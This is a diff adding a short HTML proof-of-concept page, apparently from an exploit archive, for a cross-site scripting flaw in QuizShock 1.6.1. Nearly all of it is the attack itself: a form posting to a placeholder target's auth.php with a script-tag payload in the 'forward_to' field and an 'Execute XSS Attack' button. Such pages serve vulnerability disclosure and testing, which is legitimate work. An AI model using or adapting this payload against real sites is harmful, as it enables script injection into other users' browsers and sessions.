@@ -1,0 +1,17 @@
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;QuizShock 1.6.1 Cross-Site Scripting Vulnerability&lt;/title&gt;&lt;body&gt;
+
+&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;font size=4&gt;QuizShock 1.6.1 Cross-Site Scripting Vulnerability&lt;/font&gt;&lt;br&gt;&lt;font size=3&gt;discovered by &lt;a
+href=&quot;http://john-martinelli.com&quot;&gt;John Martinelli&lt;/a&gt;&lt;/font&gt;&lt;br&gt;
+
+&lt;br&gt;&lt;br&gt;
+&lt;form action=&quot;http://target.com/auth.php&quot; method=&quot;post&quot;&gt;
+&lt;input type=hidden name=ts_username size=10 class=&quot;input&quot;&gt;
+&lt;input name=&quot;forward_to&quot; size=75 value=&quot;&amp;lt;&amp;quot;&amp;lt;&lt;script&gt;alert(551660661);&lt;/script&gt;&quot;&gt;
+&lt;input type=hidden name=&quot;fn&quot; value=&quot;login&quot;&gt;
+&lt;input type=hidden name=ts_password type=password class=&quot;input&quot;&gt;
+&lt;input type=hidden name=&quot;remember&quot; value=0 class=input&gt;
+&lt;input type=submit value=&quot;Execute XSS Attack&quot; class=&quot;button&quot;&gt;
+&lt;/form&gt;
+
+&lt;/body&gt;&lt;/html&gt;
